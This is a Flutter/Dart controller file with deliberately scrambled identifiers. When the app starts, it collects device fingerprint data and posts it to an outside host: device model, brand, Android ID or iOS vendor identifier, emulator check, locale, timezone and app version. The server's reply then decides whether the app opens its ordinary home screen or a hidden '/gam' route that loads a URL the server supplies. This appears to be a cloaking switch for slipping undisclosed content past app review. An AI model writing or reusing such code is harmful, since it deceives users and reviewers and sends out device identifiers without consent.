import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jagvbupld = RxBool(false);
  var glsuezpt = RxBool(true);
  var xipnac = RxString("");
  var lemuel = RxBool(false);
  var hudson = RxBool(true);
  final zyqtvobaxj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    uslja();
  }


  Future<void> uslja() async {

    lemuel.value = true;
    hudson.value = true;
    glsuezpt.value = false;

    zyqtvobaxj.post("https://miao.meiether.info/SrrrJmrlnq4",data: await xnkbqze()).then((value) {
      var qcios = value.data["qcios"] as String;
      var wmecuin = value.data["wmecuin"] as bool;
      if (wmecuin) {
        xipnac.value = qcios;
        laney();
      } else {
        wunsch();
      }
    }).catchError((e) {
      glsuezpt.value = true;
      hudson.value = true;
      lemuel.value = false;
    });
  }

  Future<Map<String, dynamic>> xnkbqze() async {
    final DeviceInfoPlugin szckhlav = DeviceInfoPlugin();
    PackageInfo jfcsydbx_ezakxtc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gztciys = Platform.localeName;
    var ntjhcO = currentTimeZone;

    var qEWvgJer = jfcsydbx_ezakxtc.packageName;
    var ElWzD = jfcsydbx_ezakxtc.version;
    var utyzd = jfcsydbx_ezakxtc.buildNumber;

    var YBrL = jfcsydbx_ezakxtc.appName;
    var BqEyH = "";
    var jazlynGoodwin = "";
    var uyYQ = "";
    var JLaphe  = "";
    var alveraBahringer = "";
    var marcHerzog = "";


    var erlMItLT = "";
    var GqIApdR = false;

    if (GetPlatform.isAndroid) {
      erlMItLT = "android";
      var lvehzykt = await szckhlav.androidInfo;

      BqEyH = lvehzykt.brand;

      uyYQ  = lvehzykt.model;
      JLaphe = lvehzykt.id;

      GqIApdR = lvehzykt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      erlMItLT = "ios";
      var zjaispfuy = await szckhlav.iosInfo;
      BqEyH = zjaispfuy.name;
      uyYQ = zjaispfuy.model;

      JLaphe = zjaispfuy.identifierForVendor ?? "";
      GqIApdR  = zjaispfuy.isPhysicalDevice;
    }
    var res = {
      "YBrL": YBrL,
      "utyzd": utyzd,
      "qEWvgJer": qEWvgJer,
      "uyYQ": uyYQ,
      "erlMItLT": erlMItLT,
      "ntjhcO": ntjhcO,
      "BqEyH": BqEyH,
      "ElWzD": ElWzD,
      "JLaphe": JLaphe,
      "gztciys": gztciys,
      "GqIApdR": GqIApdR,
      "alveraBahringer" : alveraBahringer,
      "jazlynGoodwin" : jazlynGoodwin,
      "marcHerzog" : marcHerzog,

    };
    return res;
  }

  Future<void> wunsch() async {
    Get.offAllNamed("/home");
  }

  Future<void> laney() async {
    Get.offAllNamed("/gam");
  }
}
